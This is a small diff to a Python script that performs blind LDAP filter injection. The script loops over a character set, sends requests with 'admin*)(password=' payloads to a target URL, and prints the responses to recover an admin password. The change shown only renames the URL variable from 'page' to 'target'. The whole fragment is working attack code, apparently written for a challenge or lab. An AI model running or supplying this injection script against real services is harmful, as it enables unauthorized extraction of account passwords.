@@ -2,7 +2,7 @@ import requests
 import urllib
     
 charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-page = ""
+target = ""
 passwd=""
     
 continuer=True
@@ -11,7 +11,7 @@ for t in range(0,50):
         continuer=False
         for carac in charset:
             #payload=(("search", "admin*)(password="+passwd+carac))
-            payload=page+("admin*)(password="+urllib.quote_plus(passwd+carac))
+            payload=target+("admin*)(password="+urllib.quote_plus(passwd+carac))
             res = requests.get(payload)
             print ("Result : ",res.text)
     
